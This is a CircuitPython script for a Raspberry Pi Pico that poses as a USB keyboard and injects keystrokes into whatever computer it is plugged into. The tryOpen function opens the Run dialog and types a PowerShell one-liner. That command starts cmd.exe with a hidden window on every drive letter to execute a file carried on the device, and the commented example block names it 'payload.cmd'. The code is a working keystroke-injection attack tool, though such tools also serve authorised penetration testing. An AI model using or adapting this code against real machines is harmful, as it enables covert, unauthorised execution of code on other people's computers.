import usb_hid # type: ignore
from adafruit_hid.keyboard import Keyboard # type: ignore
from adafruit_hid.keycode import Keycode # type: ignore
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout # type: ignore
from time import sleep as zzz

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)
    
def sendStr(text): layout.write(text)#Send a string of keys, they will be entered
def keyDown(key): kbd.press(key)#Press a key (Keycode.A = 'a', Keycode.ENTER = enter, ...)
def keyUp(key): kbd.release(key)#Release a key
def keyPress(key, delay = 0.01):#Quickly press and release a key, you can customize the delay in seconds
    keyDown(key)
    zzz(delay)
    keyUp(key)
    
def guiKey(key, delay = 0.01):#Quickly press a GUI-key (WIN + L = guiKey(Keycode.L)) You can customize the delay in seconds
    kbd.press(Keycode.GUI, key)
    zzz(delay)
    kbd.release(Keycode.GUI, key)
    
def enter():#Quickly press enter once
    keyPress(Keycode.ENTER)

def startup():#Startup of USB device, wait 3.5 seconds till explorer window pops up
    zzz(3.5)
    
def tryOpen(file):#Try to open a file on all avaliable disks of the connected device. This is used to execute a file on the pico from itself
    guiKey(Keycode.D)
    zzz(0.1)
    guiKey(Keycode.R)
    zzz(0.1)
    ps_command = f'powershell -Command "foreach ($d in [char[]](65..90)) {{ Start-Process cmd.exe -ArgumentList \'/c\', \\"$($d):\\\\{file}\\" -WindowStyle Hidden }}"'
    sendStr(ps_command)
    enter()

#Begin custom code (uncomment these example lines to make them work⚠️)
# startup()
# tryOpen("payload.cmd")
# guiKey(Keycode.L)#Does: WIN + L (Goes to the login-screen)
#End custom code
